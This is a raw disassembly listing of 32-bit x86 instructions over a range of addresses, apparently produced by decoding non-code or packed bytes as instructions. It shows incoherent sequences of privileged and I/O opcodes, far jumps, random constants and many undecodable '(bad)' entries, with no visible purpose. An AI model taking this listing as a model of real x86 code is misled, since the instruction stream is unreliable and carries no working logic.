  4166a2:	les    esi,FWORD PTR fs:[edx+ebp*4-0x6e5198c8]
  4166aa:	jmp    0xc33f93c
  4166af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4166b0:	jbe    0x41665e
  4166b2:	and    DWORD PTR [eax-0x698c9680],0x7b
  4166b9:	mov    ds:0x8bb49814,al
  4166be:	sub    al,0x78
  4166c0:	jmp    0x9eb9:0xf1a09f21
  4166c7:	std    
  4166c8:	inc    ebx
  4166c9:	ins    BYTE PTR es:[edi],dx
  4166ca:	mov    eax,0x258ffaad
  4166cf:	aad    0x9d
  4166d1:	and    al,0x10
  4166d3:	add    ch,0x66
  4166d6:	pusha  
  4166d7:	or     BYTE PTR [ebx],ch
  4166d9:	(bad)  
  4166da:	nop
  4166db:	int3   
  4166dc:	jno    0x41666f
  4166de:	pop    eax
  4166df:	pusha  
  4166e0:	lahf   
  4166e1:	cmc    
  4166e2:	push   esi
  4166e3:	adc    BYTE PTR [edx],bl
  4166e5:	pop    edx
  4166e6:	hlt    
  4166e7:	or     eax,0x2b061a45
  4166ec:	pop    ds
  4166ed:	hlt    
  4166ee:	stos   DWORD PTR es:[edi],eax
  4166ef:	mov    esi,DWORD PTR [ebp-0x1e34eda7]
  4166f5:	inc    ecx
  4166f6:	xchg   BYTE PTR [esi-0x8812c18],bl
  4166fc:	or     BYTE PTR ds:0xdc8eb546,0x7f
  416703:	jb     0x4166b7
  416705:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416706:	loopne 0x416732
  416708:	call   0x25fa:0x7b7bb550
  41670f:	xchg   ebx,eax
  416710:	sbb    eax,DWORD PTR [edx]
  416712:	and    al,0x23
  416714:	xchg   edi,eax
  416715:	cmp    al,0x2a
  416717:	(bad)  
  416718:	pop    edx
  416719:	xor    DWORD PTR [edi-0x7],ecx
  41671c:	test   al,0xc7
  41671e:	xchg   ebp,eax
  41671f:	and    ebp,0x461668aa
  416725:	and    eax,0x2754711e
  41672a:	rol    BYTE PTR [edx],1
  41672c:	je     0x416756
  41672e:	in     al,0x1f
  416730:	rol    ebp,cl
  416732:	es jnp 0x416795
  416735:	jge    0x416794
  416737:	push   ebp
  416738:	outs   dx,DWORD PTR ds:[esi]
  416739:	std    
  41673a:	or     eax,0x8ccf1e4c
  41673f:	ja     0x41678e
  416741:	add    ebp,DWORD PTR [esi+0x3c65945b]
  416747:	fimul  DWORD PTR cs:[edx]
  41674a:	inc    esi
  41674b:	ror    DWORD PTR es:[edi+0x30b62d47],0x97
  416753:	add    al,0x39
  416755:	pop    eax
  416756:	sbb    eax,0xd2d90197
  41675b:	jp     0x4166e2
  41675d:	test   al,dl
  41675f:	sub    ebx,0xffffffd4
  416762:	cmp    cl,BYTE PTR [eax]
  416764:	sbb    eax,DWORD PTR [esi]
  416766:	jne    0x41674e
  416768:	fidiv  WORD PTR [esi-0x406193d7]
  41676e:	xor    eax,0xfe69c080
  416773:	xchg   esp,eax
  416774:	xor    al,0xfe
  416776:	adc    DWORD PTR [esi],ebp
  416778:	and    DWORD PTR [esi],0xdbec5cd9
  41677e:	pusha  
  41677f:	inc    ecx
  416780:	(bad)  
  416781:	out    0x12,eax
  416783:	call   0xc992ec81
  416788:	xor    dh,BYTE PTR [eax-0x28]
  41678b:	hlt    
  41678c:	inc    esp
  41678d:	int3   
  41678e:	jno    0x4167d8
  416790:	and    eax,0x3ea06f67
  416795:	add    bh,BYTE PTR [ebp+0x7d]
  416798:	jecxz  0x4167e0
  41679a:	xor    dh,0xe2
  41679d:	(bad)  
  41679e:	cmp    ebx,ebp
  4167a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4167a1:	(bad)  
  4167a2:	scas   eax,DWORD PTR es:[edi]
  4167a3:	push   edi
  4167a4:	mov    WORD PTR [edx+0x163cee39],ss
  4167aa:	das    
  4167ab:	in     al,dx
  4167ac:	lahf   
  4167ad:	shl    DWORD PTR [ebx+eax*1+0x5cbf006],0x53
  4167b5:	daa    
  4167b6:	pop    ds
  4167b7:	push   edi
  4167b8:	sti    
  4167b9:	dec    ebx
  4167ba:	jmp    0x4167a5
  4167bc:	jo     0x4167f8
  4167be:	rol    dh,0xb5
  4167c1:	cld    
  4167c2:	pop    ss
  4167c3:	jle    0x416832
  4167c5:	or     BYTE PTR [eax+0x59591d48],0x9e
  4167cc:	(bad)
  4167cf:	xchg   edx,eax
  4167d0:	and    BYTE PTR [ebp-0x1f],bl
  4167d3:	int    0xc8
  4167d5:	stos   DWORD PTR es:[edi],eax
  4167d6:	mov    bl,0x40
  4167d8:	or     edx,DWORD PTR [ebx+0x3e]
  4167db:	nop
  4167dc:	pop    ebx
  4167dd:	push   ds
  4167de:	shl    BYTE PTR [edi],cl
  4167e0:	mov    BYTE PTR [ebp+0x6f],dl
  4167e3:	cmp    al,0x3b
  4167e5:	adc    eax,0x4a1339a8
  4167eb:	mov    esi,0x866b143c
  4167f0:	and    DWORD PTR [edi-0x3cb250ef],0x8464e847
  4167fa:	jmp    0x9c6d:0xa0b8c8bc
  416801:	sbb    al,BYTE PTR [ebx+0x14e0ca08]
  416807:	(bad)  
  416808:	clc    
  416809:	stc    
  41680a:	push   esi
  41680b:	std    
  41680c:	mov    eax,0xdfc77926
  416811:	icebp  
  416812:	jecxz  0x4167fa
  416814:	bt     DWORD PTR [eax],eax
  416817:	fidivr DWORD PTR [edi]
  416819:	fidivr DWORD PTR [ecx-0x10]
  41681c:	add    esp,ebp
  41681e:	mov    ch,0x96
  416820:	mov    es,WORD PTR ds:0x9a41dc38
  416826:	retf   
  416827:	shl    DWORD PTR [edx],0x19
  41682a:	sub    DWORD PTR [ecx],edi
  41682c:	lods   al,BYTE PTR ds:[esi]
  41682d:	mov    gs,WORD PTR [ebp+0x5b6c4fae]
  416833:	nop
  416834:	ja     0x416836
  416836:	or     edi,DWORD PTR [ebx-0x2c]
  416839:	add    bl,al
  41683b:	pop    edx
  41683c:	or     al,0xfb
  41683e:	xor    bl,ah
  416840:	shl    ebp,0xb8
  416843:	mov    ebp,0xaadfd2cb
  416848:	dec    esi
  416849:	shl    BYTE PTR [ecx-0x55b3fc9e],0x91
  416850:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416851:	retf   
  416852:	cdq    
  416853:	lea    ecx,ds:[ebx+0x794b4eb4]
  41685a:	or     DWORD PTR ss:0xb308aee9,ebx
  416861:	jl     0x416848
  416863:	cmp    al,0xc9
  416865:	test   al,0xf1
  416867:	jmp    0x24ffe15a
  41686c:	(bad)  
  41686d:	sub    BYTE PTR ds:0x6b1bc0f0,al
  416873:	out    dx,al
  416874:	out    0xfd,eax
  416876:	bound  edx,QWORD PTR [edx]
  416878:	jge    0x41683b
  41687a:	sbb    DWORD PTR [ecx],0xffffffa8
  41687d:	adc    ebp,DWORD PTR [ebx]
  41687f:	mov    gs,WORD PTR [esi+0x72bfb5]
  416885:	add    edx,DWORD PTR [edi]
  416887:	icebp  
  416888:	mov    WORD PTR [eax],ss
  41688a:	ds push 0x3842d386
  416890:	adc    DWORD PTR [eax+ecx*4+0x72efc640],0x20
  416898:	pop    edx
  416899:	fnsave [eax-0x14f3379c]
  41689f:	cdq    
  4168a0:	bnd jbe 0x416913
  4168a3:	xor    al,0xb
  4168a5:	push   edi
  4168a6:	inc    edx
  4168a7:	xor    dl,BYTE PTR [eax-0x49]
  4168aa:	repz sub DWORD PTR [esi],esp
  4168ad:	mov    ch,0xb6
  4168af:	js     0x416895
  4168b1:	add    cl,0x82
  4168b4:	or     ebx,DWORD PTR [eax-0x6e]
  4168b7:	test   al,0xb5
  4168b9:	sti    
  4168ba:	mov    WORD PTR ds:0xe6bc9dfd,fs
  4168c0:	in     al,dx
  4168c1:	aam    0xe2
  4168c3:	ss inc ebx
  4168c5:	sub    DWORD PTR [edx+0x49d68116],ebp
  4168cb:	push   ss
  4168cc:	(bad)  
  4168cd:	cli    
  4168ce:	inc    ecx
  4168cf:	mov    ebx,0x2b921dcc
  4168d4:	in     al,dx
  4168d5:	mov    dh,0x5a
  4168d7:	mov    dh,0x57
  4168d9:	mov    cl,bh
  4168db:	jmp    0xefcb:0x60c4b232
  4168e2:	sbb    DWORD PTR [ebx-0x7d],edx
  4168e5:	loope  0x416884
  4168e7:	xchg   edx,eax
  4168e8:	cmp    al,0x59
  4168ea:	jb     0x41692b
  4168ec:	test   BYTE PTR [eax],al
  4168ee:	pop    ds
  4168ef:	add    ah,BYTE PTR [ecx+esi*1]
  4168f2:	dec    ecx
  4168f3:	mov    DWORD PTR [ecx-0x28],esi
  4168f6:	inc    edx
  4168f7:	iret   
  4168f8:	sub    al,0xf7
  4168fa:	pop    edx
  4168fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4168fc:	retf   0x5d0f
  4168ff:	fwait
  416900:	dec    esi
  416901:	sub    al,0xcc
  416903:	jbe    0x41688f
  416905:	inc    ebx
  416906:	into   
  416907:	outs   dx,DWORD PTR ds:[esi]
  416908:	(bad)  
  416909:	sti    
  41690a:	pop    ss
  41690b:	push   ebx
  41690c:	lds    eax,FWORD PTR [ecx+0x65]
  41690f:	scas   al,BYTE PTR es:[edi]
  416910:	test   al,0xe0
  416912:	cmp    edx,DWORD PTR [ebp-0x70]
  416915:	xchg   ecx,eax
  416916:	stos   BYTE PTR es:[edi],al
  416917:	sbb    dl,bl
  416919:	fisttp QWORD PTR [edi+0x306f99ef]
  41691f:	ret    
  416920:	or     eax,DWORD PTR [ecx+0x2f52a659]
  416926:	das    
  416927:	fwait
  416928:	stos   BYTE PTR es:[edi],al
  416929:	out    0xc1,eax
  41692b:	hlt    
  41692c:	mov    eax,0x83a0d2bd
  416931:	cmp    DWORD PTR [ecx],esi
  416933:	out    dx,al
  416934:	sbb    al,0xc1
  416936:	(bad)  
  416937:	out    0x1f,al
  416939:	and    ebx,DWORD PTR [ecx+0x221c9014]
  41693f:	fsub   QWORD PTR [eax+edi*4-0x67]
  416943:	cmp    al,0x43
  416945:	out    0xbe,al
  416947:	and    al,0x97
  416949:	sbb    DWORD PTR [ebx-0x625dd744],ecx
  41694f:	push   ds
  416950:	pop    ecx
  416951:	enter  0xe426,0xf2
  416955:	add    al,0xf1
  416957:	pop    bp
  416959:	aad    0x78
  41695b:	ins    BYTE PTR es:[edi],dx
  41695c:	stc    
  41695d:	adc    bh,BYTE PTR [edx+0x79ae2a1b]
  416963:	pop    edi
  416964:	(bad)  
  416965:	out    dx,al
  416966:	pop    ecx
  416967:	and    eax,0x63e953a2
  41696c:	jp     0x4169bc
  41696e:	iret   
  41696f:	add    al,BYTE PTR [ebx-0x61cc022b]
  416975:	sbb    esp,DWORD PTR [ebx+0x4b]
  416978:	lahf   
  416979:	jge    0x4169cc
  41697b:	data16 jl 0x4169a5
  41697e:	sub    bl,ah
  416980:	mov    dl,0x7a
  416982:	(bad)  
  416984:	int3   
  416985:	sub    BYTE PTR [esi-0x6a],bh
  416988:	mov    ecx,0xd2fa7dc9
  41698d:	dec    edi
  41698e:	mov    esp,0x55d573a4
  416993:	mov    ah,0x1d
  416995:	int3   
  416996:	scas   al,BYTE PTR es:[edi]
  416997:	or     BYTE PTR [ebp-0x394b0fd3],dl
  41699d:	pop    es
  41699e:	push   ecx
  41699f:	shl    DWORD PTR [esp+edx*8-0x24],cl
  4169a3:	or     esp,ecx
  4169a5:	mov    bh,0x1b
  4169a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4169a8:	pop    edx
  4169a9:	sbb    ebp,DWORD PTR [ebp-0x3384714a]
  4169af:	add    ch,0x3d
  4169b2:	call   0x85c8876f
  4169b7:	js     0x416977
  4169b9:	pop    ebp
  4169ba:	js     0x4169e5
  4169bc:	fisub  WORD PTR [eax+esi*4]
  4169bf:	cmp    al,0x2f
  4169c1:	jb     0x4169da
  4169c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4169c4:	addr16 ds cdq 
  4169c7:	retf   0xf23e
  4169ca:	pop    esi
  4169cb:	or     BYTE PTR [edi-0x4f],al
  4169ce:	xlat   BYTE PTR ds:[ebx]
  4169cf:	imul   edx,DWORD PTR [eax+0x13],0x2042b04e
  4169d6:	sahf   
  4169d7:	push   ecx
  4169d8:	in     eax,dx
  4169d9:	ret    
  4169da:	push   cs
  4169db:	out    0xfd,eax
  4169dd:	fcomp  QWORD PTR [ecx]
  4169df:	pop    esp
  4169e0:	cmp    BYTE PTR [edx-0x32],bl
  4169e3:	(bad)  
  4169e4:	fmul   DWORD PTR [ebp-0x47423782]
  4169ea:	sahf   
  4169eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4169ec:	xchg   esp,eax
  4169ed:	jb     0x41699c
  4169ef:	push   ebx
  4169f0:	push   cs
  4169f1:	das    
  4169f2:	add    dl,BYTE PTR [eax-0x13]
  4169f5:	pop    esp
  4169f6:	pop    ecx
  4169f7:	in     eax,0x40
  4169f9:	xchg   esi,eax
  4169fa:	xchg   DWORD PTR [ebx-0x4e44bb1d],esp
  416a00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a01:	in     al,dx
  416a02:	add    DWORD PTR [edx+0x5e],0x6e
  416a06:	lods   al,BYTE PTR ds:[si]
  416a08:	outs   dx,BYTE PTR ds:[esi]
  416a09:	cli    
  416a0a:	call   0xc7ce:0x36678e14
  416a11:	mov    ebx,0x6146bda6
  416a16:	repnz add al,0xfc
  416a19:	pop    ds
  416a1a:	test   DWORD PTR [edi+0x444d6906],ebx
  416a20:	mov    edx,0xad9e088a
  416a25:	cs cld 
  416a27:	pop    ss
  416a28:	mov    ebx,0x44c6456b
  416a2d:	lods   eax,DWORD PTR ds:[esi]
  416a2e:	in     al,dx
  416a2f:	fisttp WORD PTR [edx]
  416a31:	mov    edx,DWORD PTR [edx]
  416a33:	pmaddwd mm2,QWORD PTR [edi+0x7269ea8f]
  416a3a:	lods   al,BYTE PTR ds:[esi]
  416a3b:	push   esi
  416a3c:	xor    eax,0x89254f6c
  416a41:	sbb    edx,DWORD PTR [ebx]
  416a43:	shl    edi,1
  416a45:	enter  0x27e4,0x1
  416a49:	adc    ah,ah
  416a4b:	repnz out 0x3a,eax
  416a4e:	nop
  416a4f:	mov    ebx,0x705b6e28
  416a54:	lods   al,BYTE PTR ds:[esi]
  416a55:	jo     0x416a0e
  416a57:	and    ebp,edx
  416a59:	jbe    0x416a75
  416a5b:	retf   0xe3d8
  416a5e:	test   BYTE PTR [edx],dl
  416a60:	test   eax,0xe6da638b
  416a65:	js     0x416a71
  416a67:	add    bh,BYTE PTR [eax]
  416a69:	or     al,0x11
  416a6b:	aas    
  416a6c:	(bad)  
  416a6d:	shl    DWORD PTR [esi+0x11],cl
  416a70:	pop    ecx
  416a71:	aam    0x12
  416a73:	mov    ah,BYTE PTR [eax]
  416a75:	mov    ah,0xee
  416a77:	or     DWORD PTR ds:0x6908a514,edi
  416a7d:	js     0x416a0c
  416a7f:	and    bl,dh
  416a81:	rol    edx,cl
  416a83:	in     al,0x34
  416a85:	fwait
  416a86:	out    0x70,al
  416a88:	jbe    0x416ad8
  416a8a:	jb     0x416abc
  416a8c:	dec    ebx
  416a8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a8e:	and    bh,dl
  416a90:	rcl    BYTE PTR [edi+0x55d2ff52],cl
  416a96:	and    cl,dl
  416a98:	data16 mov dl,0x84
  416a9b:	in     al,0x7c
  416a9d:	pusha  
  416a9e:	inc    edi
  416a9f:	jns    0x416ac3
  416aa1:	xor    al,0x37
  416aa3:	mov    WORD PTR [ebx],gs
  416aa5:	push   eax
  416aa6:	leave  
  416aa7:	sub    esi,esi
  416aa9:	inc    ebp
  416aaa:	mov    bh,0x7f
  416aac:	fcomp  QWORD PTR [ecx+edx*8+0x21]
  416ab0:	retf   
  416ab1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ab2:	or     BYTE PTR [esi+edi*1+0x4a],0xbf
  416ab7:	imul   ebx,DWORD PTR [edi+0x35ec8f20],0xffffffa7
  416abe:	sub    BYTE PTR [esi],bh
  416ac0:	mov    ?,WORD PTR [ebx-0xe2125e3]
  416ac6:	addr16 jmp 0x295d51bd
  416acc:	pop    esp
  416acd:	cdq    
  416ace:	ins    DWORD PTR es:[edi],dx
  416acf:	or     al,0x21
  416ad1:	inc    esp
  416ad2:	icebp  
  416ad3:	pushf  
  416ad4:	std    
  416ad5:	xchg   ebx,eax
  416ad6:	mov    bl,0x3f
  416ad8:	fadd   QWORD PTR [edx]
  416ada:	int3   
  416adb:	and    bl,dl
  416add:	es dec ebx
  416adf:	xlat   BYTE PTR ds:[ebx]
  416ae0:	mov    dl,0x9e
  416ae2:	fcmovnu st,st(1)
  416ae4:	and    eax,esi
  416ae6:	sub    al,0xa1
  416ae8:	jno    0x416b5d
  416aea:	jo     0x416a8d
  416aec:	mov    ds:0xbc793f0a,eax
  416af1:	(bad)  
  416af2:	fcom   DWORD PTR [edx+0x3b]
  416af5:	pop    esi
  416af6:	jns    0x416a9f
  416af8:	imul   esi,DWORD PTR [ebp-0x1440e407],0xfb4ed9b7
  416b02:	pmaxsw mm7,QWORD PTR [eax+0x10]
  416b06:	daa    
  416b07:	retf   0x8f71
  416b0a:	adc    BYTE PTR ds:0x2f2094c3,0x2d
  416b11:	inc    ebx
  416b12:	and    dl,BYTE PTR [ebp+0x78]
  416b15:	add    ch,ch
  416b17:	and    al,0x54
  416b19:	pushf  
  416b1a:	jbe    0x416b49
  416b1c:	dec    esi
  416b1d:	pusha  
  416b1e:	or     edi,ecx
  416b20:	xchg   ecx,esp
  416b22:	push   ds
  416b23:	dec    esp
  416b24:	push   edx
  416b25:	xor    edi,DWORD PTR [ecx+0x2e2cf668]
  416b2b:	mov    bh,bh
  416b2d:	and    al,0x56
  416b2f:	(bad)  
  416b30:	fs mov al,0xba
  416b33:	push   0x127ff1ae
  416b38:	jnp    0x416af7
  416b3a:	fucomp st(1)
  416b3c:	inc    eax
  416b3d:	leave  
  416b3e:	loop   0x416b5e
  416b40:	xchg   cl,ah
  416b42:	mov    eax,0x5974189b
  416b47:	daa    
  416b48:	lods   al,BYTE PTR ds:[esi]
  416b49:	sbb    BYTE PTR [edi-0x30],dl
  416b4c:	(bad)  
  416b4e:	mov    esp,0xcb44c419
  416b53:	push   ecx
  416b54:	add    DWORD PTR [edx-0x1a5985b8],edi
  416b5a:	js     0x416b43
  416b5c:	mov    BYTE PTR [ebp+0x6b],bh
  416b5f:	fcomp  DWORD PTR [ebp+0x50fe83d2]
  416b65:	int3   
  416b66:	mov    esp,0xd367edc6
  416b6b:	and    BYTE PTR [ebx],al
  416b6d:	jns    0x416b3c
  416b6f:	push   es
  416b70:	(bad)  
  416b71:	in     al,dx
  416b72:	nop
  416b73:	inc    edx
  416b74:	inc    edi
  416b75:	jg     0x416afd
  416b77:	add    al,0x9e
  416b79:	jno    0x416b09
  416b7b:	xchg   ebp,eax
  416b7c:	gs int3 
  416b7e:	mov    esi,0xea426a66
  416b83:	(bad)  
  416b84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b85:	adc    BYTE PTR [edx],ah
  416b87:	mov    edi,0xdc2ad0cb
  416b8c:	(bad)  
  416b8d:	jl     0x416b21
  416b8f:	xchg   esi,eax
  416b90:	iret   
  416b91:	cmp    edi,DWORD PTR ds:0xf3f6cdc6
  416b97:	jecxz  0x416bf7
  416b99:	mov    edi,edi
  416b9b:	(bad)  
  416b9c:	lahf   
  416b9d:	jns    0x416bef
  416b9f:	mov    cl,0xf7
  416ba1:	fistp  DWORD PTR [ebx-0x1056a83]
  416ba7:	cli    
  416ba8:	adc    DWORD PTR [edx],eax
  416baa:	adc    BYTE PTR [ecx-0x4a],dl
  416bad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416bae:	imul   eax,DWORD PTR [ebp+0x7b5a2790],0xc3a1076d
  416bb8:	scas   al,BYTE PTR es:[edi]
  416bb9:	add    edx,edi
  416bbb:	shl    BYTE PTR [ebx],0x4d
  416bbe:	push   ds
  416bbf:	or     eax,0x362a26de
  416bc4:	mov    edx,0x8faf1fb7
  416bc9:	dec    esi
  416bca:	add    BYTE PTR [ecx+0x23],0xf3
  416bce:	xchg   BYTE PTR [ebx],ch
  416bd0:	dec    ebx
  416bd2:	clc    
  416bd3:	mov    ah,0xe4
  416bd5:	dec    edi
  416bd6:	sbb    esp,DWORD PTR ds:0x73950d33
  416bdc:	mov    ebx,0x26e10287
  416be1:	(bad)  [esp+esi*4-0xd4b6058]
  416be8:	xchg   esp,eax
  416be9:	addr16 leave 
  416beb:	dec    esp
  416bec:	es call 0xc8eb:0xd3e159fb
  416bf4:	mov    ecx,0xc90a4e84
  416bf9:	test   DWORD PTR [edi-0x3e],ebx
  416bfc:	mov    ecx,0x6d61fae9
  416c01:	gs ins BYTE PTR es:[edi],dx
  416c03:	inc    edi
  416c04:	lea    ebp,[ebx-0x6f1de447]
  416c0a:	test   eax,0x15ac18ac
  416c0f:	add    DWORD PTR [ebx+edx*2],0x487293af
  416c16:	inc    edi
  416c17:	dec    eax
  416c18:	xchg   ecx,eax
  416c19:	sub    edx,eax
  416c1b:	les    esp,FWORD PTR [edi+edi*8]
  416c1e:	dec    ecx
  416c1f:	mov    bl,bh
  416c21:	in     eax,dx
  416c22:	jb     0x416c6b
  416c24:	inc    ecx
  416c25:	xor    bh,ch
  416c27:	pop    ebp
  416c28:	shr    cl,0xa1
  416c2b:	in     eax,0x20
  416c2d:	add    DWORD PTR [esi-0x32],esi
  416c30:	pop    edx
  416c31:	mov    eax,0x1f0fb0a7
  416c36:	push   esi
  416c37:	popf   
  416c38:	sahf   
  416c39:	rcl    DWORD PTR [edx-0x3c],0x7a
  416c3d:	mov    esi,0x5592367b
  416c42:	xchg   DWORD PTR [esi-0x362f9ea3],ebx
  416c48:	(bad)  
  416c49:	push   ecx
  416c4a:	pop    ss
  416c4b:	push   ebp
  416c4c:	hlt    
  416c4d:	mov    dh,0xbc
  416c4f:	lea    ebp,[ebx]
  416c51:	xchg   DWORD PTR [esp+ecx*8],ebp
  416c54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c55:	jecxz  0x416ca2
  416c57:	mov    ah,0x7
  416c59:	fisubr WORD PTR [ecx-0x3d]
  416c5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c5d:	mov    bh,0x7a
  416c5f:	mov    ds:0xf29960a6,eax
  416c64:	nop
  416c65:	mov    ebp,0xf605c8a3
  416c6a:	mov    ch,0xc7
  416c6c:	or     BYTE PTR [edx-0x58],0xbd
  416c70:	pop    ebp
  416c71:	sub    esp,0xf39bc64f
  416c77:	or     DWORD PTR [ebp-0x26],esp
  416c7a:	inc    ecx
  416c7b:	sahf   
  416c7c:	(bad)  
  416c7e:	jo     0x416cb8
  416c80:	jns    0x416c8a
  416c82:	hlt    
  416c83:	xchg   dl,dh
  416c85:	enter  0x4c8c,0x68
  416c89:	fdiv   QWORD PTR [ebp+ebp*2-0x181a638c]
  416c90:	add    BYTE PTR [ecx+ecx*8+0x717f9443],dh
  416c97:	xor    ebx,0x25a2abe2
  416c9d:	dec    esi
  416c9e:	dec    ecx
  416c9f:	sub    BYTE PTR [edx-0x412950a2],dh
  416ca5:	jne    0x416c3f
  416ca7:	leave  
  416ca8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ca9:	aaa    
  416caa:	in     al,dx
  416cab:	adc    DWORD PTR [ebx-0x57b228e9],esi
  416cb1:	ficomp WORD PTR [esi]
  416cb3:	xor    al,0x96
  416cb5:	xchg   edi,eax
  416cb6:	mov    eax,0xbcc0a953
  416cbb:	stc    
  416cbc:	mov    ebp,0x1ffc3428
  416cc1:	xchg   DWORD PTR [ecx-0x20],eax
  416cc4:	outs   dx,DWORD PTR ds:[esi]
  416cc5:	es jge 0x416d3d
  416cc8:	dec    edi
  416cc9:	jno    0x416ce3
  416ccb:	test   al,0x11
  416ccd:	jp     0x416ccb
  416ccf:	(bad)  
  416cd0:	jmp    0x416d21
  416cd2:	je     0x416d2b
  416cd4:	out    dx,al
  416cd5:	enter  0xb486,0x53
  416cd9:	(bad)  
  416cda:	ret    0xec86
  416cdd:	popf   
  416cde:	fst    st(2)
  416ce0:	stos   BYTE PTR es:[edi],al
  416ce1:	mov    eax,ds:0x9582e58b
  416ce6:	push   edx
  416ce7:	push   cs
  416ce8:	jg     0x416d51
  416cea:	mov    dh,0xde
  416cec:	imul   ebx,esp,0xffffffb2
  416cef:	xchg   esp,eax
  416cf0:	cmpxchg BYTE PTR [ecx],bl
  416cf3:	sbb    al,bh
  416cf5:	ss mov esi,0xd5fa7850
  416cfb:	shr    DWORD PTR [edi+edx*1+0x7f],1
  416cff:	fbstp  TBYTE PTR [eax-0x2]
  416d02:	neg    DWORD PTR [edx+0x13679ddd]
  416d08:	jg     0x416ce3
  416d0a:	xchg   edx,eax
  416d0b:	fistp  WORD PTR [eax+0x4f]
  416d0e:	mov    ds:0xa7efc49b,al
  416d13:	retf   0x71df
  416d16:	(bad)  
  416d17:	(bad)  
  416d18:	(bad)  
  416d19:	dec    ebp
  416d1a:	or     eax,0x8f618b30
  416d1f:	xchg   BYTE PTR [edi],dh
  416d21:	add    eax,DWORD PTR [eax]
  416d23:	pop    esp
  416d24:	pusha  
  416d25:	mov    esp,0x8a6e8baa
  416d2a:	add    DWORD PTR [ebx+0x64614760],0xffffffcd
  416d31:	adc    bl,dl
  416d33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d34:	cwde   
  416d35:	dec    esp
  416d36:	data16 fdiv QWORD PTR [eax+0x9]
  416d3a:	dec    BYTE PTR [edi+ebx*1-0x9]
  416d3e:	mov    ebx,0xe8c399e4
  416d43:	add    ecx,edi
  416d45:	mov    dh,0xba
  416d47:	inc    edi
  416d48:	jo     0x416cd2
  416d4a:	sbb    al,BYTE PTR [eax-0x32]
  416d4d:	lods   eax,DWORD PTR ds:[esi]
  416d4e:	xchg   esp,eax
  416d4f:	jmp    DWORD PTR [ebx-0x50]
  416d52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d53:	mov    ebx,0xf415df85
  416d58:	pop    edx
  416d59:	addr16 inc eax
  416d5b:	sub    ah,BYTE PTR [ebp+0x504ea9dc]
  416d61:	push   0xb37b08f3
  416d66:	lods   eax,DWORD PTR ds:[esi]
  416d67:	out    0xce,al
  416d69:	fdiv   st,st(1)
  416d6b:	dec    edi
  416d6c:	daa    
  416d6d:	cwde   
  416d6e:	cli    
  416d6f:	out    0xae,eax
  416d71:	sub    edi,ebx
  416d73:	pop    esp
  416d74:	sahf   
  416d75:	jb     0x416db6
  416d77:	xor    ecx,edx
  416d79:	pushf  
  416d7a:	xchg   ecx,eax
  416d7b:	leave  
  416d7c:	lds    eax,FWORD PTR [edx+0x966ac2f]
  416d82:	mov    dh,0xd3
  416d84:	or     ebp,DWORD PTR [ebx+0x55]
  416d87:	mov    bh,0xca
  416d89:	inc    edi
  416d8a:	mov    ch,0xbc
  416d8c:	test   al,0x23
  416d8e:	fdivp  st(1),st
  416d90:	pushf  
  416d91:	dec    ebx
  416d92:	in     eax,dx
  416d93:	ror    DWORD PTR [ebx+0x3ee43230],1
  416d99:	hlt    
  416d9a:	xor    DWORD PTR [ebp+0x75d86b67],edi
  416da0:	and    esi,DWORD PTR [edx-0xe]
  416da3:	mov    al,ds:0x84c105c6
  416da8:	jg     0x416da3
  416daa:	xchg   ebx,eax
  416dab:	add    esi,ebp
  416dad:	mov    ebp,0x6fe4ecfc
  416db2:	(bad)  
  416db3:	cmp    eax,0xf991ed44
  416db8:	lock mov edx,0x19a5a3dc
  416dbe:	test   DWORD PTR [edi],0x74a659cd
  416dc4:	ins    BYTE PTR es:[edi],dx
  416dc5:	jne    0x416d48
  416dc7:	std    
  416dc8:	cwde   
  416dc9:	sub    al,0x87
  416dcb:	adc    BYTE PTR [ecx],dh
  416dcd:	pop    esi
  416dce:	loop   0x416daa
  416dd0:	enter  0x64ac,0x35
  416dd4:	lods   eax,DWORD PTR ds:[esi]
  416dd5:	(bad)  
  416dd6:	adc    al,0x13
  416dd8:	pushf  
  416dd9:	sbb    bh,BYTE PTR ds:0xc498eb42
  416ddf:	jge    0x416dd4
  416de1:	sar    BYTE PTR [eax+edx*1],0x2e
  416de5:	dec    ecx
  416de6:	out    0x65,eax
  416de8:	data16 mov ch,0xe8
  416deb:	hlt    
  416dec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ded:	jmp    0x416dbc
  416def:	cwde   
  416df0:	scas   eax,DWORD PTR es:[edi]
  416df1:	ss mov bl,0xd7
  416df4:	mov    ds:0x9915bddc,eax
  416df9:	neg    DWORD PTR [ebx]
  416dfb:	(bad)
  416dfe:	(bad)  
  416dff:	jne    0x416e63
  416e01:	add    ebx,DWORD PTR [ecx+0x43ef61b6]
  416e07:	adc    eax,0x3f36cc2e
  416e0c:	ret    
  416e0d:	mov    ah,BYTE PTR [eax+0x776bb8b2]
  416e13:	cmp    eax,0x640a9436
  416e18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e19:	les    ebx,FWORD PTR [ebx-0x27c4a0f2]
  416e1f:	jne    0x416de3
  416e21:	sbb    BYTE PTR [edx+0x6d],0x4
  416e25:	retf   
  416e26:	test   al,0xbe
  416e28:	xchg   ch,cl
  416e2a:	or     dl,BYTE PTR [ebx-0x7d76a8d4]
  416e30:	stos   BYTE PTR es:[edi],al
  416e31:	sbb    bl,BYTE PTR [esp]
  416e34:	xor    al,0x65
  416e36:	xor    esp,edx
  416e38:	push   edx
  416e39:	pushf  
  416e3a:	inc    esp
